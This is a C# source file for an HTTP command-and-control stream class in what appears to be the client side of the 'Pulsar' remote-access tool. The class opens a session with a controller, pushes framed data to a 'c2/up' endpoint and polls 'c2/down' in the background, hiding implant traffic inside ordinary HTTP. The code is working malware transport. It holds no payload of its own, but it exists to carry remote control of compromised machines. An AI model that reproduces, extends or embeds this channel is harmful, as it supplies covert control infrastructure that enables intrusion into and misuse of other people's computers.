using System;
using System.Buffers.Binary;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.IO;
using System.Net.Http;
using System.Diagnostics;
using System.Threading;
using System.Threading.Tasks;

namespace Pulsar.Client.Networking
{
    internal sealed class HttpC2ClientStream : Stream
    {
        private readonly Uri _baseUri;
        private readonly HttpClient _httpClient;
        private readonly ConcurrentQueue<byte> _incomingQueue = new ConcurrentQueue<byte>();
        private readonly AutoResetEvent _dataAvailable = new AutoResetEvent(false);
        private readonly CancellationTokenSource _cts = new CancellationTokenSource();
        private readonly object _disposeLock = new object();
        private readonly Queue<byte> _frameBuffer = new Queue<byte>();
        private readonly object _frameBufferLock = new object();

        private const int FrameHeaderSize = 4;

        private string _sessionId;
        private bool _disposed;

        public HttpC2ClientStream(Uri baseUri)
        {
            _baseUri = baseUri ?? throw new ArgumentNullException(nameof(baseUri));

            var handler = new HttpClientHandler
            {
                AllowAutoRedirect = true,
                UseCookies = false
            };

            _httpClient = new HttpClient(handler)
            {
                BaseAddress = _baseUri
            };

            InitializeSession();
            _ = Task.Run(PollDownstreamAsync, _cts.Token);
        }

        public override bool CanRead => !_disposed;
        public override bool CanSeek => false;
        public override bool CanWrite => !_disposed;
        public override long Length => throw new NotSupportedException();
        public override long Position { get => throw new NotSupportedException(); set => throw new NotSupportedException(); }

        public override void Flush()
        {
        }

        public override int Read(byte[] buffer, int offset, int count)
        {
            ValidateBuffer(buffer, offset, count);
            EnsureNotDisposed();

            int bytesRead = 0;
            while (bytesRead == 0)
            {
                while (_incomingQueue.TryDequeue(out byte value) && bytesRead < count)
                {
                    buffer[offset + bytesRead] = value;
                    bytesRead++;
                }

                if (bytesRead > 0 || _disposed)
                {
                    break;
                }

                _dataAvailable.WaitOne(100);
            }

            return bytesRead;
        }

        public override IAsyncResult BeginRead(byte[] buffer, int offset, int count, AsyncCallback callback, object state)
        {
            var task = Task.Run(() => Read(buffer, offset, count));
            if (callback != null)
            {
                task.ContinueWith(t => callback(t), TaskScheduler.Default);
            }

            return task;
        }

        public override int EndRead(IAsyncResult asyncResult)
        {
            if (asyncResult is Task<int> task)
            {
                return task.GetAwaiter().GetResult();
            }

            throw new ArgumentException("Invalid asyncResult", nameof(asyncResult));
        }

        public override void Write(byte[] buffer, int offset, int count)
        {
            ValidateBuffer(buffer, offset, count);
            EnsureNotDisposed();

            // Wrap the application payload in the HTTP framing header so the server can deframe back to the TCP-style stream.
            var framedPayload = new byte[FrameHeaderSize + count];
            BinaryPrimitives.WriteInt32LittleEndian(new Span<byte>(framedPayload, 0, FrameHeaderSize), count);
            Buffer.BlockCopy(buffer, offset, framedPayload, FrameHeaderSize, count);

#if DEBUG
            Debug.WriteLine($"[HTTP C2 CLIENT] Outgoing appLen={count}, framedLen={framedPayload.Length}, preview={PreviewHex(buffer, offset, count)}");
#endif

            using var content = new ByteArrayContent(framedPayload);
            var response = _httpClient
                .PostAsync($"c2/up?sid={_sessionId}", content, _cts.Token)
                .GetAwaiter()
                .GetResult();

            response.EnsureSuccessStatusCode();
        }

        public override IAsyncResult BeginWrite(byte[] buffer, int offset, int count, AsyncCallback callback, object state)
        {
            var task = Task.Run(() => Write(buffer, offset, count));
            if (callback != null)
            {
                task.ContinueWith(t => callback(t), TaskScheduler.Default);
            }

            return task;
        }

        public override void EndWrite(IAsyncResult asyncResult)
        {
            if (asyncResult is Task task)
            {
                task.GetAwaiter().GetResult();
                return;
            }

            throw new ArgumentException("Invalid asyncResult", nameof(asyncResult));
        }

        public override long Seek(long offset, SeekOrigin origin)
        {
            throw new NotSupportedException();
        }

        public override void SetLength(long value)
        {
            throw new NotSupportedException();
        }

        protected override void Dispose(bool disposing)
        {
            lock (_disposeLock)
            {
                if (_disposed)
                {
                    base.Dispose(disposing);
                    return;
                }

                _disposed = true;
                _cts.Cancel();
                _dataAvailable.Set();
                _httpClient.Dispose();
                _cts.Dispose();
                _dataAvailable.Dispose();
            }

            base.Dispose(disposing);
        }

        private void InitializeSession()
        {
            var response = _httpClient.PostAsync("c2/open", new ByteArrayContent(Array.Empty<byte>()), _cts.Token)
                .GetAwaiter()
                .GetResult();

            response.EnsureSuccessStatusCode();

            var session = response.Content.ReadAsStringAsync().GetAwaiter().GetResult();
            _sessionId = session?.Trim();

            if (string.IsNullOrWhiteSpace(_sessionId))
            {
                throw new InvalidOperationException("Failed to obtain session id for HTTP C2 stream.");
            }
        }

        private async Task PollDownstreamAsync()
        {
            while (!_cts.IsCancellationRequested)
            {
                try
                {
                    using (var response = await _httpClient.PostAsync($"c2/down?sid={_sessionId}", new ByteArrayContent(Array.Empty<byte>()), HttpCompletionOption.ResponseHeadersRead, _cts.Token))
                    {
                        response.EnsureSuccessStatusCode();
                        using (var stream = await response.Content.ReadAsStreamAsync(_cts.Token))
                        {
                            var buffer = new byte[8192];
                            int read;
                            while ((read = await stream.ReadAsync(buffer, 0, buffer.Length, _cts.Token)) > 0)
                            {
                                // Only feed framed bytes into the HTTP frame processor; it will queue app payloads for consumers.
                                ProcessIncomingFrames(buffer, read);
                            }
                        }
                    }
                }
                catch (OperationCanceledException)
                {
                    break;
                }
                catch
                {
                    await Task.Delay(1000, _cts.Token).ConfigureAwait(false);
                }
            }
        }

        private void ProcessIncomingFrames(byte[] buffer, int count)
        {
            lock (_frameBufferLock)
            {
                for (int i = 0; i < count; i++)
                {
                    _frameBuffer.Enqueue(buffer[i]);
                }

                while (TryDequeueFrame(out var frame))
                {
#if DEBUG
                    Debug.WriteLine($"[HTTP C2 CLIENT] Incoming frame len={frame.Length}, preview={PreviewHex(frame, 0, frame.Length)}");
#endif
                    for (int i = 0; i < frame.Length; i++)
                    {
                        _incomingQueue.Enqueue(frame[i]);
                    }

                    _dataAvailable.Set();
                }
            }
        }

#if DEBUG
        private static string PreviewHex(byte[] buffer, int offset, int count)
        {
            var previewLength = Math.Min(count, 16);
            if (previewLength <= 0)
            {
                return string.Empty;
            }

            return BitConverter.ToString(buffer, offset, previewLength).Replace("-", " ");
        }
#endif

        private bool TryDequeueFrame(out byte[] payload)
        {
            payload = null;

            if (_frameBuffer.Count < FrameHeaderSize)
            {
                return false;
            }

            var header = new byte[FrameHeaderSize];
            int idx = 0;
            foreach (var b in _frameBuffer)
            {
                header[idx++] = b;
                if (idx == FrameHeaderSize)
                {
                    break;
                }
            }

            int length = BinaryPrimitives.ReadInt32LittleEndian(header);
            if (length <= 0)
            {
                throw new InvalidDataException($"Invalid HTTP frame length: {length}.");
            }

            if (_frameBuffer.Count < FrameHeaderSize + length)
            {
                return false;
            }

            for (int i = 0; i < FrameHeaderSize; i++)
            {
                _frameBuffer.Dequeue();
            }

            payload = new byte[length];
            for (int i = 0; i < length; i++)
            {
                payload[i] = _frameBuffer.Dequeue();
            }

            return true;
        }

        private void ValidateBuffer(byte[] buffer, int offset, int count)
        {
            if (buffer == null)
                throw new ArgumentNullException(nameof(buffer));

            if (offset < 0 || count < 0 || offset + count > buffer.Length)
                throw new ArgumentOutOfRangeException(nameof(offset));
        }

        private void EnsureNotDisposed()
        {
            if (_disposed)
            {
                throw new ObjectDisposedException(nameof(HttpC2ClientStream));
            }
        }
    }
}
